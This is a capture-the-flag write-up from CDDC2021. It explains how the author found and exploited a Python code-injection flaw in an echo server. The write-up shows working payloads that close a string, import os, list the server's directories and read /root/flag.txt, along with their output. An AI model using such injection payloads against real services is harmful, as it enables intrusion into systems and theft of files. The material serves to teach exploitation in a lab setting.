Python code injection attack on an echo server. Third pwn challenge in CDDC2021.

# Challenge Description

Your last mission, for now, looks promising. Itâ€™s some kind of an echo server. I think you can exploit it easily.

Target: 18.136.182.104 port 60230

# Solution

For challenges like these, I like to spam weird characters. Luckily my first one gave me syntax error: `"`.

This tells me that they are not escaping my quote but is using it to terminate the string, hence having an unclosed quote at the back. Something like this:

```python
print(""")
```

I took a brave guess that it is Python because of the syntax error message. So I tried to list the current directory and echo it back.

```
input> ");import os;print(os.system("ls"))#

Program output:
```

*Note: this effectively does something like this (for what I had in mind at this point in time)*
```python
print("");import os;print(os.system("ls"))#")
```

So our payload needs to be in the form of `");<code>#`
{: .notice--info}

Hmmm, that means that it doesn't use `print` to echo back. I played around a bit and got this:

```
input> ", end="asdf");#

Error: sendBack() expects 1 argument, 2 received
```

Sounds like some websocket is being used. So I just need to find out the variables it has and I can leak the current directory, and get the flag.

```
input> "+'|'.join(dir()))#

Program output: conn|functionPointer|ram|userData|userDataPointer
```

`dir()` returns all variables available in the current scope, which is perfect. `conn` should be the websocket connection. So I can do something like this:

```
input> ");import os;conn.send('\n'.join(os.listdir(os.getcwd())));#

Program output: lib64
opt
tmp
usr
home
run
libx32
proc
srv
var
dev
media
boot
lib
root
etc
sbin
bin
mnt
lib32
sys
.dockerenv
```

Changing the directory for a bit:

```
input> ");import os;conn.send(' '.join(os.listdir(os.getcwd() + 'root')));#

Program output: .bashrc .profile buffer_overflow.py exploit.sh memory flag.txt
```

*Wait what? Buffer overflow???? XD*

# Final Payload
```
");conn.send(open('/root/flag.txt').read());#
```

Flag: `CDDC21{Py780n_!$_N!c3}`
